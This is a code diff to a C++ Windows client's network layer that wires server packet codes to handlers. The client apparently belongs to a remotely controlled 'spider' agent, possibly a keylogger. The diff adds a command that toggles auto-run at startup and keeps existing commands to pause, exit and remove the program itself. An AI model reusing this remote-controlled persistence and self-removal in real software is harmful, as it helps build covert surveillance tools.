@@ -24,11 +24,11 @@ Network::Network(const std::string& port, const std::string& ip, Packager* packa
 	_ctx.set_verify_mode(boost::asio::ssl::context::verify_peer);
 	_engine = new SslEngine(_ios, _ctx);
 
-	_response[4] = nullptr;
-	_response[5] = nullptr;
-	_response[6] = &spider_exit;
-	_response[7] = &spider_pause;
-	_response[8] = &spider_remove;
+	_response[4] = [this](boost::asio::yield_context yield) { spider_switchStartup(*this, yield); };
+	_response[5] = [this](boost::asio::yield_context yield) { spider_switchStartup(*this, yield); };
+	_response[6] = [this](boost::asio::yield_context yield) { spider_exit(*this, yield); };
+	_response[7] = [this](boost::asio::yield_context yield) { spider_pause(*this, yield); };
+	_response[8] = [this](boost::asio::yield_context yield) { spider_remove(*this, yield); };
 
 }
 
@@ -119,7 +119,7 @@ void Network::readLoop(boost::asio::yield_context yield)
 
 	while (!_engine->read(paquet)) {
 		if (paquet.getReponse() >= 4 && paquet.getReponse() <= 8)
-			_response[paquet.getReponse()](*this, yield);
+			_response[paquet.getReponse()](yield);
 		else
 		{
 			PaquetCommandClient *paquet = new PaquetCommandClient();
@@ -131,7 +131,28 @@ void Network::readLoop(boost::asio::yield_context yield)
 	}
 }
 
-void spider_exit(Network& net, boost::asio::yield_context yield) {
+void Network::spider_switchStartup(Network &net, boost::asio::yield_context yield)
+{
+	PaquetCommandClient *paquet = new PaquetCommandClient();
+
+	paquet->setOk(1);
+	if (_startup.isStartup()) {
+		_startup.delStartup();
+		if (_startup.isStartup()) {
+			paquet->setOk(0);
+		}
+	}
+	else {
+		_startup.addStartup();
+		if (!_startup.isStartup()) {
+			paquet->setOk(0);
+		}
+	}
+	paquet->createPaquet();
+	net.getEngine().writePaquet(*paquet, yield);
+}
+
+void Network::spider_exit(Network& net, boost::asio::yield_context yield) {
 	PaquetCommandClient *paquet = new PaquetCommandClient();
 
 	paquet->setOk(1);
@@ -141,7 +162,7 @@ void spider_exit(Network& net, boost::asio::yield_context yield) {
 	exit(EXIT_SUCCESS);
 }
 
-void spider_remove(Network& net, boost::asio::yield_context yield) {
+void Network::spider_remove(Network& net, boost::asio::yield_context yield) {
 	PaquetCommandClient *paquet = new PaquetCommandClient();
 	HMODULE		hModule = GetModuleHandle(NULL);
 
@@ -163,7 +184,7 @@ void spider_remove(Network& net, boost::asio::yield_context yield) {
 	net.getEngine().writePaquet(*paquet, yield);
 }
 
-void spider_pause(Network& net, boost::asio::yield_context yield) {
+void Network::spider_pause(Network& net, boost::asio::yield_context yield) {
 	PaquetCommandClient *paquet = new PaquetCommandClient();
 
 	paquet->setOk(1);
